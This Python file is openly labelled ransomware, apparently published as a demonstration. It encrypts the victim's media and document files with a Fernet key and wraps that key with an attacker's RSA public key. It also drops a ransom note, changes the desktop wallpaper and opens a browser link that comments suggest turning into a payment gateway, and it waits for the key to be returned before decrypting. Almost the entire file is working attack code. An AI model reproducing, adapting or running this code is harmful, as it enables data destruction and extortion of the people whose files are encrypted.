#!/usr/bin/python3
from cryptography.fernet import Fernet # Encrypt/Decrypt files on target
import os # Get System root
import webbrowser # Load User's Browser
import ctypes # Call DLLs or Shared libaraies
import subprocess # to open up notepad 
import threading # For Multi threading
import platform # Checking Platform
import urllib.request
import requests
from time import sleep
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES,PKCS1_OAEP # PKCS#1 OAEP is an asymmetric cipher based on RSA and the OAEP padding

def getOS():

	#Get OS Information
	victim_os=platform.system()
	print(f"[+] Victim Is Running A {victim_os} Environment")
	if victim_os=='Windows':
		return 0
	elif victim_os=='Linux':
		return 1
	else :
		return -1

class Ransomware:

	file_exts=['txt','mp4','pdf','png'] # Types of files to encrypt

	def __init__(self):

		#Initialize Variables
		self.os_int=getOS()
		self.key=None
		self.crypter=None
		self.public_key=None
		self.sysRoot = os.path.expanduser('~')  #H ome Directory Of Current User
		self.localRoot = os.path.dirname(os.path.abspath(__file__)) # Path Of Directory Where Program is Placed
		self.PublicIP = requests.get('https://api.ipify.org').text # Check For Gov/Military IPs
		print(f"[+] System Root Found At : {self.sysRoot}")
		print(f"[+] Local Root Found At : {self.localRoot}")
		print(f"[+] Public IP Of Victim : {self.PublicIP}")

	def generate_key(self):

		#Generate Fernet Key and Create Fernet Object
		self.key = Fernet.generate_key() # Generate Symmetric Fernet Key To Encrypt/Decrypt Files
		print(f"[+] Generated Fernet Key As : {self.key}") 
		self.crypter = Fernet(self.key) # Create Fernet Object
		print(f"[+] Created Crypter As : {self.crypter}")

	def write_key(self):

		# Write Key To A Local Text File
		with open('fernet_key.txt','wb') as f:
			f.write(self.key)
		print("[+] Wrote Fernet Key Into : fernet_key.txt") 
	
	def encrypt_fernet_key(self):

		# Encrypt Fernet Key With Public Key Of Attacker
		with open('fernet_key.txt','rb') as fk:
			fernet_key=fk.read() # Store Contents Of The File As A Backup
		print("[+] Read Fernet Key From fernet_key.txt")

		with open("fernet_key.txt",'wb') as f:
			self.public_key=RSA.importKey(open('public.pem').read()) # Import RSA Public Key Of Attacker
			print(f"[+] Read Public Key From public.pem As {self.public_key}")
			public_encryptor=PKCS1_OAEP.new(self.public_key) #Return a cipher object PKCS1OAEP_Cipher that can be used to perform PKCS#1 OAEP encryption or decryption
			enc_fernet_key=public_encryptor.encrypt(fernet_key) #encrypt fernet key with public key
			f.write(enc_fernet_key) # Write Out The Contents Of The Text File With Encrypted Text
		print("[+] Encrypted fernet_key.txt With Attacker's Public RSA Key")
		
		with open(f"{self.sysRoot}/Desktop/EMAIL_ME.txt",'wb') as fa :
			fa.write(enc_fernet_key)
		print(f"[+] Creted EMAIL_ME.txt at {self.sysRoot}/Desktop ")

		# Remove Any Data As Good Measure
		self.key=enc_fernet_key
		self.crypter=None 
		print(f"[+] Nullified Key as {self.key}")
		print(f"[+] Nullified Crypter Object as {self.crypter}")

	def crypt_file(self,file_path,encrypted=False):
		
		#Encrypt/Decrypt Files
		with open(file_path,'rb') as f : 
			data=f.read() # read Data from file
			print(f"[+] Crypter Object In Use : {self.crypter}")
			# Encrypt Data
			if not encrypted :
				print(f"{file_path} is Being Encrypted ")
				_data=self.crypter.encrypt(data)
				print(f"{file_path} Has Been Encrypted ")

			# Decrypt Data
			else :
				print(f"{file_path} is Being Decrypted ")
				_data=self.crypter.decrypt(data)
				print(f"{file_path} Has Been Decrypted ")

		with open(file_path,'wb') as fp :
			fp.write(_data)

	def crypt_system(self,encrypted=False):

		#List All Files in the system
		system= os.walk(self.localRoot,topdown=True) # Can be Changed to sys.sysRoot
		for root,dir,files in system :
			for file in files :
				file_path=os.path.join(root, file)
				if not file.split('.')[-1] in self.file_exts:
					continue
				if not encrypted:
					self.crypt_file(file_path)
				else :
					self.crypt_file(file_path,encrypted=True)

	@staticmethod
	def whokilleddb_github(): 

		# Open Browser Window
		url = "https://github.com/whokilleddb" #Change It To A Payment Gateway Maybe ?
		webbrowser.open(url)

	def change_desktop_background(self):

		# Change Desktop Background
		if self.os_int == 0 :
			imageURL = "https://i.imgur.com/lCW3YGu.jpg"
			path=f"{self.sysRoot}\\Desktop\\Background.jpg"
			urllib.request.urlretrieve(imageURL,path)

			SPI_SETDESKWALLPAPER = 20 # 0x14 (Desktop Parameter as Set By Win32 API)
			
			# The Actual Defination of the C Function as Defined Under SystemParametersInfoW has the following defination
			# private static extern bool SystemParametersInfoW(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
			# uiAction  = SPI_SETDESKWALLPAPER = 20
			# uiParam remains 0 when changing wallpaper 
			# pvParam  contains file path
			# fWinIni determines how the change is written to user profile and whether a message should be sent to other windows to notify them of the update.
			ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER,0,path,0) # For 32 bit Windows, use SystemParametersInfoA

	def ransom_note(self):

		#Prompt Note To Victim
		note=f"Your Files Have Been Encrypted. Get The Full Code At https://github.com/whokilleddb. Also Send {self.sysRoot}/Desktop/EMAIL_ME.txt to the Attacker"

		with open("fernet_key.txt",'rb') as fp :
			self.key= fp.read()

		with open('RANSOM_NOTE.txt','w') as f:
			f.write(note)

		if self.os_int ==0 :
			ransom = subprocess.Popen(['notepad.exe','RANSOM_NOTE.txt'])

	def put_me_on_desktop(self) :
		#Check if key exists on Desktop
		flag=True
		while flag :
			try :
				with open(f"{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt",'r') as f:
					self.key= f.read()
					print(f"[+] Read Key From {self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt As {self.key}")
					self.crypter=Fernet(self.key)
					print(f"[+] New Cryptor Object Created As : {self.crypter}")
					self.crypt_system(encrypted=True)
					flag=False
			except :
				pass
			sleep(10)

if __name__ == '__main__':

	rw = Ransomware()
	rw.generate_key()
	rw.crypt_system()
	rw.write_key()
	rw.encrypt_fernet_key()
	rw.change_desktop_background()
	rw.whokilleddb_github()

	t1 = threading.Thread(target=rw.ransom_note)
	t2 = threading.Thread(target=rw.put_me_on_desktop)

	t1.start()
	print(" > Target Encrypted")
	t2.start()
	print(" > Attack Completed")
